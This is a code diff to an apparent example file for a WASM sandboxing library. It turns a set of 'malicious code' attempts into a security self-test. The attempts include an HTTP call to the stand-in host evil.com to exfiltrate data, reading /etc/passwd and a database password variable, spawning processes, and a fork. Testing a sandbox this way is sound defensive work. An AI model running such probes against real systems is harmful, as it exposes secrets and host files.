@@ -20,11 +20,6 @@ Examples of malicious code that fails in the sandbox.
 - Common attack patterns that fail
 """
 
-import os
-import subprocess
-
-import httpx
-
 from blazing import Blazing
 
 
@@ -37,42 +32,56 @@ async def main():
         """
         Malicious code examples - all FAIL in WASM sandbox.
         """
-        # ❌ ATTEMPT 1: Network exfiltration
+        results = []
+
+        # ATTEMPT 1: Network exfiltration
         try:
-            # This import FAILS - httpx not available in WASM
+            import httpx
             await httpx.get("http://evil.com/exfiltrate")
-        except ImportError:
-            pass  # httpx not available in sandbox
-        # ❌ ATTEMPT 2: Read secrets from filesystem
+            results.append("network: FAILED TO BLOCK (bad!)")
+        except (ImportError, Exception):
+            results.append("network: BLOCKED (good!)")
+
+        # ATTEMPT 2: Read secrets from filesystem
         try:
             with open("/etc/passwd") as f:
                 f.read()
-        except (FileNotFoundError, OSError):
-            pass  # No filesystem access in sandbox
-        # ❌ ATTEMPT 3: Spawn process
+            results.append("filesystem: FAILED TO BLOCK (bad!)")
+        except (FileNotFoundError, OSError, PermissionError):
+            results.append("filesystem: BLOCKED (good!)")
+
+        # ATTEMPT 3: Spawn process
         try:
+            import subprocess
             subprocess.run(["ls", "/"])
-        except (ImportError, FileNotFoundError):
-            pass  # subprocess not available in sandbox
-        # ❌ ATTEMPT 4: Access environment variables
+            results.append("subprocess: FAILED TO BLOCK (bad!)")
+        except (ImportError, FileNotFoundError, OSError):
+            results.append("subprocess: BLOCKED (good!)")
+
+        # ATTEMPT 4: Access environment variables
         try:
-            os.getenv("DATABASE_PASSWORD")
+            import os
+            secret = os.getenv("DATABASE_PASSWORD")
+            if secret:
+                results.append("env_vars: FAILED TO BLOCK (bad!)")
+            else:
+                results.append("env_vars: BLOCKED (good!)")
         except Exception:
-            pass  # No access to host environment
-        # ❌ ATTEMPT 5: Fork bomb
+            results.append("env_vars: BLOCKED (good!)")
+
+        # ATTEMPT 5: Fork bomb
         try:
+            import os
             os.fork()
-        except (ImportError, AttributeError):
-            pass  # os.fork() not available in WASM
-        # ❌ ATTEMPT 6: Memory exhaustion
-        try:
-            # WASM heap limited to 512MB - will crash sandbox, not host
-            data = []
-            while True:
-                data.append("x" * 1024 * 1024)  # 1MB strings
-        except MemoryError:
-            pass  # WASM heap limit reached
-        return {"message": "All attacks blocked by sandbox"}
+            results.append("fork: FAILED TO BLOCK (bad!)")
+        except (ImportError, AttributeError, OSError):
+            results.append("fork: BLOCKED (good!)")
+
+        return {
+            "message": "Security validation complete",
+            "results": results,
+            "all_blocked": all("BLOCKED" in r for r in results)
+        }
 
     # YOUR CODE (trusted - orchestrates)
     @app.workflow
@@ -81,6 +90,19 @@ async def main():
         return await malicious_attempts(services=services)
 
     await app.publish()
+
+    # Execute the security test
+    print("Testing sandbox security boundaries...")
+    print("(All malicious attempts should be BLOCKED)\n")
+
+    result = await app.test_security().wait_result()
+
+    print("Security Test Results:")
+    for r in result['results']:
+        status = "PASS" if "BLOCKED" in r else "FAIL"
+        print(f"  [{status}] {r}")
+
+    print(f"\nAll attacks blocked: {result['all_blocked']}")
 
 
 if __name__ == "__main__":
